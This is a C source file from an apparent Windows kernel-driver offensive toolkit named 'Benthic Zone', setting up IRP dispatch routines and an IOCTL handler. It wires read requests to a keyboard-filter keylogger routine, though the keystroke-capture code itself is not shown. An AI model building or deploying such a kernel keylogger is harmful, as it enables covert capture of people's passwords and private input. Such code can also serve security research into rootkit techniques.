// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/
// This header is used by kernel
#include <ntddk.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include "Functions01OCTLs.h"
#include "Functions02IRPs.h"
#include "Techniques/KeyboardFilter.h"



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief      A passthrough function for handling IRPs (I/O Request Packets).


	@see        PDEVICE_OBJECT          https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
	@param[in]  pDeviceObject           Pointer to a DEVICE_OBJECT structure representing the device.

	@see        PIRP                    https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
	@param[in]  pIrp                    Pointer to an IRP (I/O Request Packet) to be processed.


	@return     A NTSTATUS value indicating success or an error code if operation fails.
**/
NTSTATUS
FunctionsIRPs_DriverPassthrough(
	_In_        PDEVICE_OBJECT          pDeviceObject,
	_In_        PIRP                    pIrp
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello

	// The DbgPrint routine sends a message to the kernel debugger when the conditions that you specify apply.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprint
	// DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IRPs.c] (DriverPassthrough) - Hello");


	// ---------------------------------------------------------------------------------------------------------------------
	// Preventing compiler warnings for unused parameter. We're not using the device object, so we need to mark it as unreferenced.
	UNREFERENCED_PARAMETER(pDeviceObject);


	// ---------------------------------------------------------------------------------------------------------------------
	// Set I/O status information
	// DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IRPs.c] (DriverPassthrough) - Set I/O status information");

	// A driver sets an IRP's I/O status block to indicate the final status of an I/O request, before calling IoCompleteRequest for the IRP.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_status_block
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;


	// ---------------------------------------------------------------------------------------------------------------------
	// Complete IRP processing and indicate no increment in stack location
	// DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IRPs.c] (DriverPassthrough) - Complete IRP processing and indicate no increment in stack location");

	// The IoCompleteRequest macro indicates that the caller has completed all processing for a given I/O request and is returning the given IRP to the I/O manager. IoCompleteRequest wraps IofCompleteRequest.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocompleterequest
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye

	// The DbgPrint routine sends a message to the kernel debugger when the conditions that you specify apply.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprint
	// DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IRPs.c] (DriverPassthrough) - Bye");


	// ---------------------------------------------------------------------------------------------------------------------
	// Operation was completed successfully
	return STATUS_SUCCESS;
}



/**
	@brief      Handles IOCTLs (Input/Output Control) requests from userland.


	@see        PDEVICE_OBJECT          https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
	@param[in]  pDeviceObject           Pointer to a DEVICE_OBJECT structure representing the device.

	@see        PIRP                    https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
	@param[in]  pIrp                    Pointer to an IRP (I/O Request Packet) to be processed.


	@return     A NTSTATUS value indicating success or an error code if operation fails.
**/
NTSTATUS
FunctionsIRPs_DriverHandleIOCTLs(
	_In_        PDEVICE_OBJECT          pDeviceObject,
	_In_        PIRP                    pIrp
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Preventing compiler warnings for unused parameter.
	UNREFERENCED_PARAMETER(pDeviceObject);


	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	// DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IRPs.c] (DriverHandleIOCTLs) - Hello");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	NTSTATUS status;
	char responseBuffer[MACRO_FUNCTIONSIRPS_MAX_IOCTL_RESPONSE_SIZE] = { 0 };


	// ---------------------------------------------------------------------------------------------------------------------
	// Get current stack location in IRP
	// DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IRPs.c] (DriverHandleIOCTLs) -  Get current stack location in IRP");

	// IO_STACK_LOCATION structure defines an I/O stack location, which is an entry in the I/O stack that is associated with each IRP. Each I/O stack location in an IRP has some common members and some request-type-specific members.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iogetcurrentirpstacklocation
	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(pIrp);


	// ---------------------------------------------------------------------------------------------------------------------
	// Get IOCTL code from IRP
	// DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IRPs.c] (DriverHandleIOCTLs) - Get IOCTL code from IRP");

	// The I/O Manager, other operating system components, and other kernel-mode drivers send IRP_MJ_DEVICE_CONTROL requests. Normally this IRP is sent on behalf of a user-mode application that has called the Win32 DeviceIoControl function or on behalf of a kernel-mode component that has called ZwDeviceIoControlFile.
	// https://learn.microsoft.com/en-us/previous-versions/windows/drivers/ifs/irp-mj-device-control
	ULONG controlCode = stack->Parameters.DeviceIoControl.IoControlCode;


	// ---------------------------------------------------------------------------------------------------------------------
	// Handle different IOCTL codes using a unified function
	status = UtilsIOCTLs_HandleRequest(controlCode, pIrp->AssociatedIrp.SystemBuffer, responseBuffer, sizeof(responseBuffer));


	// ---------------------------------------------------------------------------------------------------------------------
	// Copy response message to user-space buffer

	// Copy the content of a source memory block to a destination memory block
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory
	RtlCopyMemory(pIrp->AssociatedIrp.SystemBuffer, responseBuffer, strlen(responseBuffer) + 1);
	pIrp->IoStatus.Information = strlen(responseBuffer) + 1;
	pIrp->IoStatus.Status = STATUS_SUCCESS;


	// ---------------------------------------------------------------------------------------------------------------------
	// Complete IRP processing
	// DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IRPs.c] (DriverHandleIOCTLs) - Completing IRP processing");

	// The IoCompleteRequest macro indicates that the caller has completed all processing for a given I/O request and is returning the given IRP to the I/O manager. IoCompleteRequest wraps IofCompleteRequest.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocompleterequest
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	// DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IRPs.c] (DriverHandleIOCTLs) - Bye");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return pIrp->IoStatus.Status;
}



/**
	@brief      Configures the driver's dispatch routines for major IRP function codes.

	
	@see        PDEVICE_OBJECT          https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
	@param[in]  pDeviceObject           Pointer to a DEVICE_OBJECT structure representing the device.
**/
VOID
FunctionsIRPs_SetupMajorFunctions(
	_In_        PDRIVER_OBJECT          pDriverObject
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Set MajorFunction for different IRP types
	// DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IRPs.c] (SetupMajorFunctions) - Set MajorFunction for different IRP types");

	// Each driver-specific I/O stack location (IO_STACK_LOCATION) for every IRP contains a major function code (IRP_MJ_XXX), which tells the driver what operation it or the underlying device driver should carry out to satisfy the I/O request. Each kernel-mode driver must provide dispatch routines for the major function codes that it must support (https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-major-function-codes).

	// Every kernel-mode driver must handle IRP_MJ_CREATE requests in a DRIVER_DISPATCH callback function.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-create
	pDriverObject->MajorFunction[IRP_MJ_CREATE] = FunctionsIRPs_DriverPassthrough;

	// Every driver must handle close requests in a DispatchClose routine, with the possible exception of a driver whose device cannot be disabled or removed from the machine without bringing down the system. A disk driver whose device holds the system page file is an example of such a driver. Note that the driver of such a device also cannot be unloaded dynamically.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-close
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = FunctionsIRPs_DriverPassthrough;

	// Every device driver that transfers data from its device to the system must handle read requests in a DispatchRead or DispatchReadWrite routine, as must any higher-level driver layered over such a device driver.
	pDriverObject->MajorFunction[IRP_MJ_READ] = TechniquesKeyboardFilter_KeyloggerReadKeystrokes;
	//pDriverObject->MajorFunction[IRP_MJ_READ] = TechniquesKeyboardFilter_KeyloggerReadKeystrokes;

	// Every device driver that transfers data from the system to its device must handle write requests in a DispatchWrite or DispatchReadWrite routine, as must any higher-level driver layered over such a device driver.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-write
	pDriverObject->MajorFunction[IRP_MJ_WRITE] = FunctionsIRPs_DriverPassthrough;

	// Every driver whose device objects belong to a particular device type (see Specifying Device Types) is required to support this request in a DispatchDeviceControl routine, if a set of system-defined I/O control codes (IOCTLs) exists for the type. For more info about IOCTLs, see Introduction to I/O Control Codes. Higher-level drivers usually pass these requests on to an underlying device driver. Each device driver in a driver stack is assumed to support this request, along with a set of device type-specific, public or private IOCTLs. For more information about IOCTLs for specific device types, see device type-specific documentation in the Microsoft Windows Driver Kit (WDK).
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-device-control
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = FunctionsIRPs_DriverHandleIOCTLs;


	// ---------------------------------------------------------------------------------------------------------------------
	// DbgPrint("Benthic Zone -> KernelModeDriver [Functions/IRPs.c] (SetupMajorFunctions) - IRP handlers set successfully");
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
